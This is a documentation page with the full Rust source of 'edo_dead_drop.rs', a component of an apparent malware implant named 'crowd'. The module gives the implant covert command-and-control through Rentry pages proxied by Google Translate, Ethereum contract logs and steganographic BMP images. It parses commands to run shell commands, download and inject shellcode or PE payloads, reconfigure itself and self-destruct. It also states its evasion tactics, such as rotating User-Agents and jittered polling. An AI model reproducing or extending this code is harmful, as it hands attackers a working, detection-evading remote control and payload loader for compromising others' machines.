# crowd — edo_dead_drop.rs  (Edo Tensei Autonomous Dead Drop)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/edo_dead_drop.rs` |
| **Lines** | 664 |
| **Cards** | T015-edo-dead-drop |
| **Role** | Autonomous dead drop C2 |
| **Inline ASM** | Yes |
| **Unsafe blocks** | 6 |

## Purpose

# crowd — edo_dead_drop.rs  (Edo Tensei Autonomous Dead Drop)

## Dead Drop Chain — Autonomous C2 for Edo Tensei

Makes crowd.exe self-sufficient: it can receive commands and payloads
through covert channels without needing the RAVEN server. If a payload
is delivered (PE, PIC, shellcode), crowd injects it into a target process
using its existing technique stack, effectively becoming its own loader.

### Channel Chain (ordered fallback)
1. **Google Translate + Rentry** (read-only, primary)
- GET `translate.google.com/translate?sl=ja&tl=en&u=https://rentry.co/{slug}`
- Parse HTML for `---EDO_BEGIN---{hex}---EDO_END---` markers
- Evasive: request goes to a Google domain (trusted, TLS, CDN-cached)

2. **Blockchain Smart Contract** (bidirectional, fallback)
- Read: `eth_getLogs` on contract address for Message events
- Write: `eth_sendRawTransaction` with encrypted calldata
- Uses Sepolia testnet (free, no gas cost for reads)

3. **LSB Steganography** (payload delivery)
- Download image (BMP) from any URL via WinHTTP
- Extract payload hidden in least-significant bits of R,G,B channels
- Header: first 32 LSB-bits = payload length (LE u32)

### All payloads: zstd compressed + AES-256-GCM encrypted

### OPSEC
- WinHTTP (not WinINet) — no IE cache artifacts
- User-Agent rotated per request from benign pool
- Jittered polling intervals to avoid detection patterns
- Memory-only processing — no temp files
- Channel state persisted in soul storage (same backends as Edo Tensei)

## Constants

- `GT_HOST`: `&str` = `"translate.google.com"`
- `GT_PORT`: `u16` = `443`
- `MARKER_BEGIN`: `&[u8]` = `b"---EDO_BEGIN---"`
- `MARKER_END`: `&[u8]` = `b"---EDO_END---"`
- `MSG_EVENT_TOPIC`: `&str` = `"0xafb4ccb78f1474d274fbc1448b20a17655e2da57d1dd99bb0aa2e5adcb4e80df"`
- `BMP_MAGIC`: `u16` = `0x4D42` — "BM"
- `BMP_OFFSET_OFF`: `usize` = `10`
- `BMP_WIDTH_OFF`: `usize` = `18`
- `BMP_HEIGHT_OFF`: `usize` = `22`
- `BMP_BPP_OFF`: `usize` = `28`
- `NULL_HINT`: `HINTERNET` = `std::ptr::null_mut()`
- `WINHTTP_ACCESS_TYPE_NO_PROXY`: `u32` = `1`
- `WINHTTP_FLAG_SECURE`: `u32` = `0x00800000`
- `WINHTTP_FLAG_BYPASS_PROXY_CACHE`: `u32` = `0x00000100`
- `WINHTTP_ADDREQ_FLAG_ADD`: `u32` = `0x20000000`

## Types

### enum `EdoCommand` (line 80)

### struct `WinHttp` (line 482)

## Public API

### `is_enabled` (line 102)
```rust
pub fn is_enabled() -> bool
```
Check if dead drop polling is enabled for this build.

### `poll_once` (line 112)
```rust
pub fn poll_once() -> Option<Vec<EdoCommand>>
```
Run one poll cycle: try GT+Rentry first, then blockchain fallback.
Returns parsed commands if any channel had data.

### `stego_extract` (line 155)
```rust
pub fn stego_extract(url: &str) -> Result<Vec<u8>>
```
Download an image and extract hidden payload via LSB steganography.
Returns the raw (decrypted+decompressed) payload bytes.

### `download_raw` (line 171)
```rust
pub fn download_raw(url: &str) -> Result<Vec<u8>>
```
Download raw payload from a URL (not steganographic).

### `jittered_interval` (line 179)
```rust
pub fn jittered_interval() -> u64
```
Calculate jittered sleep duration.

### `extract_lsb_from_bmp` (line 305)
```rust
pub fn extract_lsb_from_bmp(data: &[u8]) -> Result<Vec<u8>>
```
Extract payload hidden in BMP image via LSB steganography.

Encoding scheme (all 3 channels — R, G, B):
- Each pixel contributes 3 bits (R_lsb, G_lsb, B_lsb) read left-to-right
- First 32 bits (from ~11 pixels): payload length as u32 LE
- Next N*8 bits: payload data

BMP is parsed natively (no Windows API dependency).

## Internal Functions

- `poll_gtranslate_rentry` (line 195)
- `parse_gt_html` — Parse Google Translate HTML response for EDO markers. (line 208)
- `poll_blockchain` (line 226)
- `eth_get_logs` — Call eth_getLogs on the contract for Message events. (line 246)
- `parse_eth_logs` — Parse JSON-RPC response for eth_getLogs, extracting message data. (line 259)
- `decrypt_and_parse` (line 412)
- `parse_commands` — Parse newline-delimited commands from decrypted plaintext. (line 420)
- `load_winhttp` (unsafe) (line 494)
- `pick_user_agent` (line 520)
- `wide` (line 530)
- `winhttp_get` — General WinHTTP GET request. Returns response body. (line 537)
- `winhttp_post` — General WinHTTP POST request. Returns response body. (line 542)
- `winhttp_request` (unsafe) (line 546)
- `parse_url` (line 613)
- `hex_decode_bytes` (line 640)
- `hex_char` (line 653)
- `find_subsequence` (line 662)

## Macros

- `get!` (macro_rules, line 499)

## Key Dependencies

- `use anyhow::{anyhow, Result};`
- `use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};`

## Full Source

```rust
//! # crowd — edo_dead_drop.rs  (Edo Tensei Autonomous Dead Drop)
//!
//! ## Dead Drop Chain — Autonomous C2 for Edo Tensei
//!
//! Makes crowd.exe self-sufficient: it can receive commands and payloads
//! through covert channels without needing the RAVEN server. If a payload
//! is delivered (PE, PIC, shellcode), crowd injects it into a target process
//! using its existing technique stack, effectively becoming its own loader.
//!
//! ### Channel Chain (ordered fallback)
//! 1. **Google Translate + Rentry** (read-only, primary)
//!    - GET `translate.google.com/translate?sl=ja&tl=en&u=https://rentry.co/{slug}`
//!    - Parse HTML for `---EDO_BEGIN---{hex}---EDO_END---` markers
//!    - Evasive: request goes to a Google domain (trusted, TLS, CDN-cached)
//!
//! 2. **Blockchain Smart Contract** (bidirectional, fallback)
//!    - Read: `eth_getLogs` on contract address for Message events
//!    - Write: `eth_sendRawTransaction` with encrypted calldata
//!    - Uses Sepolia testnet (free, no gas cost for reads)
//!
//! 3. **LSB Steganography** (payload delivery)
//!    - Download image (BMP) from any URL via WinHTTP
//!    - Extract payload hidden in least-significant bits of R,G,B channels
//!    - Header: first 32 LSB-bits = payload length (LE u32)
//!
//! ### All payloads: zstd compressed + AES-256-GCM encrypted
//!
//! ### OPSEC
//! - WinHTTP (not WinINet) — no IE cache artifacts
//! - User-Agent rotated per request from benign pool
//! - Jittered polling intervals to avoid detection patterns
//! - Memory-only processing — no temp files
//! - Channel state persisted in soul storage (same backends as Edo Tensei)

#![allow(dead_code)]

use anyhow::{anyhow, Result};
#[allow(unused_imports)] use crate::mega_dbg;

// ── Compile-time constants ──────────────────────────────────────────────────

pub use crate::payload_cfg::EDO_DROP_ENABLED;
pub use crate::payload_cfg::EDO_DROP_GT_SLUG;
pub use crate::payload_cfg::EDO_DROP_AES_KEY;
pub use crate::payload_cfg::EDO_DROP_CONTRACT_ADDR;
pub use crate::payload_cfg::EDO_DROP_RPC_URLS;
pub use crate::payload_cfg::EDO_DROP_WALLET_KEY;
pub use crate::payload_cfg::EDO_DROP_POLL_MS;
pub use crate::payload_cfg::EDO_DROP_JITTER_MS;

// ── Constants ───────────────────────────────────────────────────────────────

const GT_HOST: &str = "translate.google.com";
const GT_PORT: u16  = 443;

const MARKER_BEGIN: &[u8] = b"---EDO_BEGIN---";
const MARKER_END:   &[u8] = b"---EDO_END---";

// Ethereum Message event topic (RavenC2 contract)
const MSG_EVENT_TOPIC: &str = "0xafb4ccb78f1474d274fbc1448b20a17655e2da57d1dd99bb0aa2e5adcb4e80df";

// Benign User-Agent pool for rotation
const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Microsoft-CryptoAPI/10.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
];

// BMP header offsets
const BMP_MAGIC: u16     = 0x4D42; // "BM"
const BMP_OFFSET_OFF: usize = 10;
const BMP_WIDTH_OFF: usize  = 18;
const BMP_HEIGHT_OFF: usize = 22;
const BMP_BPP_OFF: usize    = 28;

// ── Command Types ───────────────────────────────────────────────────────────

#[derive(Debug)]
pub enum EdoCommand {
    /// Execute a shell command, return output via blockchain
    Exec { cmd: String },
    /// Download URL + inject as shellcode/PE using current technique stack
    Inject { url: String, method: Option<String> },
    /// Download image URL, extract LSB payload, then inject
    StegoLoad { url: String },
    /// Change polling interval
    Sleep { ms: u64 },
    /// Update config: change rentry slug, contract, etc.
    Config { key: String, value: String },
    /// Self-destruct: wipe and exit
    Kill,
    /// Noop/heartbeat acknowledgement
    Ping,
    /// Download raw payload from URL (not stego), inject
    Download { url: String },
}

// ── Public API ──────────────────────────────────────────────────────────────

/// Check if dead drop polling is enabled for this build.
pub fn is_enabled() -> bool {
    if EDO_DROP_ENABLED && EDO_DROP_AES_KEY.iter().all(|&b| b == 0) {
        mega_dbg!("EdoDrop: DISABLED — AES key is all-zeros (builder misconfiguration)");
        return false;
    }
    EDO_DROP_ENABLED && (!EDO_DROP_GT_SLUG.is_empty() || !EDO_DROP_CONTRACT_ADDR.is_empty())
}

/// Run one poll cycle: try GT+Rentry first, then blockchain fallback.
/// Returns parsed commands if any channel had data.
pub fn poll_once() -> Option<Vec<EdoCommand>> {
    // Channel 1: Google Translate + Rentry
    if !EDO_DROP_GT_SLUG.is_empty() {
        mega_dbg!("EdoDrop: polling GT+Rentry slug='{}'", EDO_DROP_GT_SLUG);
        match poll_gtranslate_rentry(EDO_DROP_GT_SLUG) {
            Ok(data) if !data.is_empty() => {
                mega_dbg!("EdoDrop: GT channel delivered {}B", data.len());
                match decrypt_and_parse(&data) {
                    Ok(cmds) if !cmds.is_empty() => return Some(cmds),
                    Ok(_) => { mega_dbg!("EdoDrop: GT data decrypted but no commands"); }
                    Err(e) => { mega_dbg!("EdoDrop: GT decrypt/parse failed: {}", e); }
                }
            }
            Ok(_) => { mega_dbg!("EdoDrop: GT channel empty"); }
            Err(e) => { mega_dbg!("EdoDrop: GT channel error: {}", e); }
        }
    }

    // Channel 2: Blockchain (fallback)
    if !EDO_DROP_CONTRACT_ADDR.is_empty() && !EDO_DROP_RPC_URLS.is_empty() {
        mega_dbg!("EdoDrop: polling blockchain contract={}", EDO_DROP_CONTRACT_ADDR);
        match poll_blockchain() {
            Ok(msgs) => {
                let mut all_cmds = Vec::new();
                for msg in msgs {
                    match decrypt_and_parse(&msg) {
                        Ok(cmds) => all_cmds.extend(cmds),
                        Err(e) => { mega_dbg!("EdoDrop: blockchain msg decrypt failed: {}", e); }
                    }
                }
                if !all_cmds.is_empty() {
                    return Some(all_cmds);
                }
            }
            Err(e) => { mega_dbg!("EdoDrop: blockchain error: {}", e); }
        }
    }

    None
}

/// Download an image and extract hidden payload via LSB steganography.
/// Returns the raw (decrypted+decompressed) payload bytes.
pub fn stego_extract(url: &str) -> Result<Vec<u8>> {
    mega_dbg!("EdoDrop: stego download from '{}'", url);
    let (host, path, port, https) = parse_url(url)?;
    let image_data = winhttp_get(&host, &path, port, https)?;
    mega_dbg!("EdoDrop: downloaded {}B image", image_data.len());

    let raw_payload = extract_lsb_from_bmp(&image_data)?;
    mega_dbg!("EdoDrop: extracted {}B from LSB", raw_payload.len());

    // Payload is encrypted+compressed
    let plaintext = crate::crypto::decrypt_and_decompress(&raw_payload, &EDO_DROP_AES_KEY, 0)?;
    mega_dbg!("EdoDrop: stego payload decrypted: {}B", plaintext.len());
    Ok(plaintext)
}

/// Download raw payload from a URL (not steganographic).
pub fn download_raw(url: &str) -> Result<Vec<u8>> {
    let (host, path, port, https) = parse_url(url)?;
    let data = winhttp_get(&host, &path, port, https)?;
    // Assume encrypted+compressed
    crate::crypto::decrypt_and_decompress(&data, &EDO_DROP_AES_KEY, 0)
}

/// Calculate jittered sleep duration.
pub fn jittered_interval() -> u64 {
    let base = EDO_DROP_POLL_MS;
    if EDO_DROP_JITTER_MS == 0 {
        return base;
    }
    // Simple PRNG from RDTSC for jitter
    let jitter = unsafe {
        let lo: u32;
        std::arch::asm!("rdtsc", out("eax") lo, out("edx") _);
        ((lo as u64) % (EDO_DROP_JITTER_MS * 2)) as i64 - EDO_DROP_JITTER_MS as i64
    };
    (base as i64 + jitter).max(5000) as u64
}

// ── Channel 1: Google Translate + Rentry ────────────────────────────────────

fn poll_gtranslate_rentry(slug: &str) -> Result<Vec<u8>> {
    let path = format!(
        "/translate?sl=ja&tl=en&u=https://rentry.co/{}",
        slug
    );
    let html = winhttp_get(GT_HOST, &path, GT_PORT, true)?;
    parse_gt_html(&html).ok_or_else(|| anyhow!("no EDO markers found in GT response"))
}

/// Parse Google Translate HTML response for EDO markers.
/// GT wraps the translated page in its own HTML. We search for the
/// `---EDO_BEGIN---{hex}---EDO_END---` delimiters regardless of
/// surrounding HTML structure, making this robust to GT layout changes.
fn parse_gt_html(html: &[u8]) -> Option<Vec<u8>> {
    let begin_pos = find_subsequence(html, MARKER_BEGIN)?;
    let data_start = begin_pos + MARKER_BEGIN.len();

    let end_pos = find_subsequence(&html[data_start..], MARKER_END)?;
    let hex_slice = &html[data_start..data_start + end_pos];

    // Trim whitespace and HTML entities that GT might inject
    let hex_clean: Vec<u8> = hex_slice.iter()
        .filter(|&&b| b.is_ascii_hexdigit())
        .copied()
        .collect();

    hex_decode_bytes(&hex_clean).ok()
}

// ── Channel 2: Blockchain ───────────────────────────────────────────────────

fn poll_blockchain() -> Result<Vec<Vec<u8>>> {
    let mut messages = Vec::new();

    for &rpc_url in EDO_DROP_RPC_URLS {
        match eth_get_logs(rpc_url, EDO_DROP_CONTRACT_ADDR) {
            Ok(logs) => {
                messages = logs;
                break; // Success — don't try other RPCs
            }
            Err(e) => {
                mega_dbg!("EdoDrop: RPC {} failed: {}", rpc_url, e);
                continue;
            }
        }
    }

    Ok(messages)
}

/// Call eth_getLogs on the contract for Message events.
fn eth_get_logs(rpc_url: &str, contract: &str) -> Result<Vec<Vec<u8>>> {
    let body = format!(
        r#"{{"jsonrpc":"2.0","method":"eth_getLogs","params":[{{"address":"{}","topics":["{}"],"fromBlock":"latest"}}],"id":1}}"#,
        contract, MSG_EVENT_TOPIC
    );

    let (host, path, port, https) = parse_url(rpc_url)?;
    let response = winhttp_post(&host, &path, port, https, body.as_bytes())?;

    parse_eth_logs(&response)
}

/// Parse JSON-RPC response for eth_getLogs, extracting message data.
fn parse_eth_logs(json_bytes: &[u8]) -> Result<Vec<Vec<u8>>> {
    let json_str = std::str::from_utf8(json_bytes)
        .map_err(|_| anyhow!("invalid UTF-8 in RPC response"))?;

    let mut messages = Vec::new();

    // Minimal JSON parsing: find "data":"0x..." fields in result array
    let mut search_from = 0;
    while let Some(pos) = json_str[search_from..].find("\"data\":\"0x") {
        let abs_pos = search_from + pos + 8; // skip `"data":"`
        if let Some(end_quote) = json_str[abs_pos..].find('"') {
            let hex_str = &json_str[abs_pos + 2..abs_pos + end_quote]; // skip "0x"

            // ABI-encoded bytes: skip first 64 hex chars (offset pointer)
            // + next 64 hex chars (length), then read the actual data
            if hex_str.len() >= 128 {
                let len_hex = &hex_str[64..128];
                if let Ok(data_len) = usize::from_str_radix(len_hex.trim_start_matches('0').max("0"), 16) {
                    let data_start = 128;
                    let data_end = data_start + (data_len * 2);
                    if data_end <= hex_str.len() {
                        if let Ok(data) = hex_decode_bytes(hex_str[data_start..data_end].as_bytes()) {
                            messages.push(data);
                        }
                    }
                }
            }
            search_from = abs_pos + end_quote;
        } else {
            break;
        }
    }

    Ok(messages)
}

// ── Channel 3: LSB Steganography ────────────────────────────────────────────

/// Extract payload hidden in BMP image via LSB steganography.
///
/// Encoding scheme (all 3 channels — R, G, B):
/// - Each pixel contributes 3 bits (R_lsb, G_lsb, B_lsb) read left-to-right
/// - First 32 bits (from ~11 pixels): payload length as u32 LE
/// - Next N*8 bits: payload data
///
/// BMP is parsed natively (no Windows API dependency).
pub fn extract_lsb_from_bmp(data: &[u8]) -> Result<Vec<u8>> {
    if data.len() < 54 {
        return Err(anyhow!("BMP too small: {} bytes", data.len()));
    }

    // Validate BMP magic
    let magic = u16::from_le_bytes([data[0], data[1]]);
    if magic != BMP_MAGIC {
        return Err(anyhow!("not a BMP file (magic=0x{:04x})", magic));
    }

    let pixel_offset = u32::from_le_bytes([
        data[BMP_OFFSET_OFF], data[BMP_OFFSET_OFF+1],
        data[BMP_OFFSET_OFF+2], data[BMP_OFFSET_OFF+3]
    ]) as usize;

    let width = i32::from_le_bytes([
        data[BMP_WIDTH_OFF], data[BMP_WIDTH_OFF+1],
        data[BMP_WIDTH_OFF+2], data[BMP_WIDTH_OFF+3]
    ]).unsigned_abs() as usize;

    let height = i32::from_le_bytes([
        data[BMP_HEIGHT_OFF], data[BMP_HEIGHT_OFF+1],
        data[BMP_HEIGHT_OFF+2], data[BMP_HEIGHT_OFF+3]
    ]);

    let bpp = u16::from_le_bytes([data[BMP_BPP_OFF], data[BMP_BPP_OFF+1]]);
    if bpp != 24 && bpp != 32 {
        return Err(anyhow!("unsupported BMP bpp={} (need 24 or 32)", bpp));
    }

    let bytes_per_pixel = (bpp / 8) as usize;
    let bottom_up = height > 0;
    let abs_height = height.unsigned_abs() as usize;

    // BMP rows are padded to 4-byte boundaries
    let row_stride = ((width * bytes_per_pixel + 3) / 4) * 4;

    if data.len() < pixel_offset + abs_height * row_stride {
        return Err(anyhow!("BMP truncated"));
    }

    // Collect all LSBs from RGB channels
    let mut bits = Vec::new();
    let total_pixels = width * abs_height;
    let max_bits_needed = 32 + (total_pixels * 3); // header + worst case
    bits.reserve(max_bits_needed.min(total_pixels * 3));

    for row_idx in 0..abs_height {
        let actual_row = if bottom_up { abs_height - 1 - row_idx } else { row_idx };
        let row_start = pixel_offset + actual_row * row_stride;

        for col in 0..width {
            let px_off = row_start + col * bytes_per_pixel;
            // BMP stores as BGR(A)
            let b = data[px_off];
            let g = data[px_off + 1];
            let r = data[px_off + 2];

            bits.push(r & 1);
            bits.push(g & 1);
            bits.push(b & 1);
        }
    }

    if bits.len() < 32 {
        return Err(anyhow!("image too small for LSB header"));
    }

    // Read payload length from first 32 bits (LE u32)
    let mut len_bytes = [0u8; 4];
    for byte_idx in 0..4 {
        let mut byte_val = 0u8;
        for bit_idx in 0..8 {
            let bit_pos = byte_idx * 8 + bit_idx;
            byte_val |= bits[bit_pos] << bit_idx;
        }
        len_bytes[byte_idx] = byte_val;
    }
    let payload_len = u32::from_le_bytes(len_bytes) as usize;

    let total_bits_needed = 32 + payload_len * 8;
    if total_bits_needed > bits.len() {
        return Err(anyhow!("LSB payload length {} exceeds available bits", payload_len));
    }

    // Sanity check: payload shouldn't be larger than 100MB
    if payload_len > 100 * 1024 * 1024 {
        return Err(anyhow!("LSB payload too large: {} bytes", payload_len));
    }

    // Extract payload bytes
    let mut payload = Vec::with_capacity(payload_len);
    for byte_idx in 0..payload_len {
        let mut byte_val = 0u8;
        for bit_idx in 0..8 {
            let bit_pos = 32 + byte_idx * 8 + bit_idx;
            byte_val |= bits[bit_pos] << bit_idx;
        }
        payload.push(byte_val);
    }

    Ok(payload)
}

// ── Crypto Helpers ──────────────────────────────────────────────────────────

fn decrypt_and_parse(data: &[u8]) -> Result<Vec<EdoCommand>> {
    let plaintext = crate::crypto::decrypt_and_decompress(data, &EDO_DROP_AES_KEY, 0)?;
    parse_commands(&plaintext)
}

/// Parse newline-delimited commands from decrypted plaintext.
///
/// Format per line: `CMD|arg1|arg2|...`
fn parse_commands(data: &[u8]) -> Result<Vec<EdoCommand>> {
    let text = std::str::from_utf8(data)
        .map_err(|_| anyhow!("command data is not valid UTF-8"))?;

    let mut cmds = Vec::new();

    for line in text.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }

        let parts: Vec<&str> = line.splitn(3, '|').collect();
        let cmd = match parts.first() {
            Some(c) => c.to_uppercase(),
            None => continue,
        };

        let arg1 = parts.get(1).unwrap_or(&"").to_string();
        let arg2 = parts.get(2).unwrap_or(&"").to_string();

        let parsed = match cmd.as_str() {
            "EXEC" | "CMD"   => EdoCommand::Exec { cmd: arg1 },
            "INJECT"         => EdoCommand::Inject { url: arg1, method: if arg2.is_empty() { None } else { Some(arg2) } },
            "STEGO" | "STEGO_LOAD" => EdoCommand::StegoLoad { url: arg1 },
            "DOWNLOAD" | "DL" => EdoCommand::Download { url: arg1 },
            "SLEEP"          => EdoCommand::Sleep { ms: arg1.parse().unwrap_or(60000) },
            "CONFIG"         => EdoCommand::Config { key: arg1, value: arg2 },
            "KILL"           => EdoCommand::Kill,
            "PING"           => EdoCommand::Ping,
            _ => {
                mega_dbg!("EdoDrop: unknown command '{}' — skipped", cmd);
                continue;
            }
        };
        cmds.push(parsed);
    }

    Ok(cmds)
}

// ── WinHTTP Helpers ─────────────────────────────────────────────────────────
// Reuses the dynamic-load pattern from winhttp_dl.rs but provides a general
// GET/POST interface for arbitrary HTTPS endpoints.

type HINTERNET = *mut std::ffi::c_void;
const NULL_HINT: HINTERNET = std::ptr::null_mut();

const WINHTTP_ACCESS_TYPE_NO_PROXY: u32 = 1;
const WINHTTP_FLAG_SECURE: u32          = 0x00800000;
const WINHTTP_FLAG_BYPASS_PROXY_CACHE: u32 = 0x00000100;

type WinHttpOpenFn    = unsafe extern "system" fn(*const u16, u32, *const u16, *const u16, u32) -> HINTERNET;
type WinHttpConnectFn = unsafe extern "system" fn(HINTERNET, *const u16, u16, u32) -> HINTERNET;
type WinHttpOpenReqFn = unsafe extern "system" fn(HINTERNET, *const u16, *const u16, *const u16, *const u16, *mut *const u16, u32) -> HINTERNET;
type WinHttpSendFn    = unsafe extern "system" fn(HINTERNET, *const u16, u32, *mut std::ffi::c_void, u32, u32, usize) -> i32;
type WinHttpRecvFn    = unsafe extern "system" fn(HINTERNET, *mut std::ffi::c_void) -> i32;
type WinHttpQueryFn   = unsafe extern "system" fn(HINTERNET, *mut u32) -> i32;
type WinHttpReadFn    = unsafe extern "system" fn(HINTERNET, *mut std::ffi::c_void, u32, *mut u32) -> i32;
type WinHttpCloseFn   = unsafe extern "system" fn(HINTERNET) -> i32;
type WinHttpAddHdrFn  = unsafe extern "system" fn(HINTERNET, *const u16, u32, u32) -> i32;

struct WinHttp {
    open:         WinHttpOpenFn,
    connect:      WinHttpConnectFn,
    open_request: WinHttpOpenReqFn,
    send:         WinHttpSendFn,
    recv_response:WinHttpRecvFn,
    query_avail:  WinHttpQueryFn,
    read:         WinHttpReadFn,
    close:        WinHttpCloseFn,
    add_headers:  WinHttpAddHdrFn,
}

unsafe fn load_winhttp() -> Result<WinHttp> {
    use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};
    let dll = LoadLibraryA(b"winhttp.dll\0".as_ptr() as _);
    if dll.is_null() { return Err(anyhow!("winhttp.dll not found")); }

    macro_rules! get {
        ($name:literal, $ty:ty) => {{
            let p = GetProcAddress(dll, concat!($name, "\0").as_ptr() as _);
            if p.is_null() { return Err(anyhow!("{} not found", $name)); }
            std::mem::transmute::<_, $ty>(p)
        }};
    }

    Ok(WinHttp {
        open:         get!("WinHttpOpen",              WinHttpOpenFn),
        connect:      get!("WinHttpConnect",           WinHttpConnectFn),
        open_request: get!("WinHttpOpenRequest",       WinHttpOpenReqFn),
        send:         get!("WinHttpSendRequest",       WinHttpSendFn),
        recv_response:get!("WinHttpReceiveResponse",   WinHttpRecvFn),
        query_avail:  get!("WinHttpQueryDataAvailable",WinHttpQueryFn),
        read:         get!("WinHttpReadData",          WinHttpReadFn),
        close:        get!("WinHttpCloseHandle",       WinHttpCloseFn),
        add_headers:  get!("WinHttpAddRequestHeaders", WinHttpAddHdrFn),
    })
}

fn pick_user_agent() -> &'static str {
    // RDTSC-based selection (no rand crate)
    let idx = unsafe {
        let lo: u32;
        std::arch::asm!("rdtsc", out("eax") lo, out("edx") _);
        (lo as usize) % USER_AGENTS.len()
    };
    USER_AGENTS[idx]
}

fn wide(s: &str) -> Vec<u16> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

/// General WinHTTP GET request. Returns response body.
fn winhttp_get(host: &str, path: &str, port: u16, use_https: bool) -> Result<Vec<u8>> {
    unsafe { winhttp_request(host, path, port, use_https, b"GET", &[]) }
}

/// General WinHTTP POST request. Returns response body.
fn winhttp_post(host: &str, path: &str, port: u16, use_https: bool, body: &[u8]) -> Result<Vec<u8>> {
    unsafe { winhttp_request(host, path, port, use_https, b"POST", body) }
}

unsafe fn winhttp_request(
    host: &str, path: &str, port: u16, use_https: bool,
    method: &[u8], body: &[u8],
) -> Result<Vec<u8>> {
    let wh = load_winhttp()?;
    let ua = wide(pick_user_agent());

    let sess = (wh.open)(ua.as_ptr(), WINHTTP_ACCESS_TYPE_NO_PROXY, std::ptr::null(), std::ptr::null(), 0);
    if sess.is_null() { return Err(anyhow!("WinHttpOpen failed")); }

    let host_w = wide(host);
    let conn = (wh.connect)(sess, host_w.as_ptr(), port, 0);
    if conn.is_null() { (wh.close)(sess); return Err(anyhow!("WinHttpConnect failed")); }

    let verb = wide(std::str::from_utf8(method).unwrap_or("GET"));
    let path_w = wide(path);
    let flags = if use_https { WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE } else { WINHTTP_FLAG_BYPASS_PROXY_CACHE };

    let req = (wh.open_request)(conn, verb.as_ptr(), path_w.as_ptr(), std::ptr::null(), std::ptr::null(), std::ptr::null_mut(), flags);
    if req.is_null() { (wh.close)(conn); (wh.close)(sess); return Err(anyhow!("WinHttpOpenRequest failed")); }

    // Add Content-Type for POST
    if !body.is_empty() {
        let ct = wide("Content-Type: application/json\r\n");
        const WINHTTP_ADDREQ_FLAG_ADD: u32 = 0x20000000;
        (wh.add_headers)(req, ct.as_ptr(), u32::MAX, WINHTTP_ADDREQ_FLAG_ADD);
    }

    let body_ptr = if body.is_empty() { std::ptr::null_mut() } else { body.as_ptr() as *mut _ };
    let body_len = body.len() as u32;
    let total_len = body.len() as u32;

    if (wh.send)(req, std::ptr::null(), 0, body_ptr, body_len, total_len, 0) == 0 {
        (wh.close)(req); (wh.close)(conn); (wh.close)(sess);
        return Err(anyhow!("WinHttpSendRequest failed"));
    }

    if (wh.recv_response)(req, std::ptr::null_mut()) == 0 {
        (wh.close)(req); (wh.close)(conn); (wh.close)(sess);
        return Err(anyhow!("WinHttpReceiveResponse failed"));
    }

    // Read response body
    let mut result = Vec::new();
    let mut buf = [0u8; 8192];

    loop {
        let mut avail: u32 = 0;
        if (wh.query_avail)(req, &mut avail) == 0 || avail == 0 { break; }
        let to_read = (avail as usize).min(buf.len()) as u32;
        let mut downloaded: u32 = 0;
        if (wh.read)(req, buf.as_mut_ptr() as _, to_read, &mut downloaded) == 0 || downloaded == 0 { break; }
        result.extend_from_slice(&buf[..downloaded as usize]);
        if result.len() > 50 * 1024 * 1024 { // 50MB safety limit
            break;
        }
    }

    (wh.close)(req);
    (wh.close)(conn);
    (wh.close)(sess);

    Ok(result)
}

// ── URL Parsing ─────────────────────────────────────────────────────────────

fn parse_url(url: &str) -> Result<(String, String, u16, bool)> {
    let (scheme, rest) = if url.starts_with("https://") {
        (true, &url[8..])
    } else if url.starts_with("http://") {
        (false, &url[7..])
    } else {
        (true, url) // default to HTTPS
    };

    let (host_port, path) = match rest.find('/') {
        Some(i) => (&rest[..i], &rest[i..]),
        None    => (rest, "/"),
    };

    let (host, port) = match host_port.rfind(':') {
        Some(i) => {
            let p = host_port[i+1..].parse::<u16>().unwrap_or(if scheme { 443 } else { 80 });
            (&host_port[..i], p)
        }
        None => (host_port, if scheme { 443 } else { 80 }),
    };

    Ok((host.to_string(), path.to_string(), port, scheme))
}

// ── Hex Helpers ─────────────────────────────────────────────────────────────

fn hex_decode_bytes(hex: &[u8]) -> Result<Vec<u8>> {
    if hex.len() % 2 != 0 {
        return Err(anyhow!("odd hex length"));
    }
    let mut out = Vec::with_capacity(hex.len() / 2);
    for chunk in hex.chunks(2) {
        let hi = hex_char(chunk[0]).ok_or_else(|| anyhow!("invalid hex char"))?;
        let lo = hex_char(chunk[1]).ok_or_else(|| anyhow!("invalid hex char"))?;
        out.push((hi << 4) | lo);
    }
    Ok(out)
}

fn hex_char(c: u8) -> Option<u8> {
    match c {
        b'0'..=b'9' => Some(c - b'0'),
        b'a'..=b'f' => Some(c - b'a' + 10),
        b'A'..=b'F' => Some(c - b'A' + 10),
        _ => None,
    }
}

fn find_subsequence(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    haystack.windows(needle.len()).position(|window| window == needle)
}

```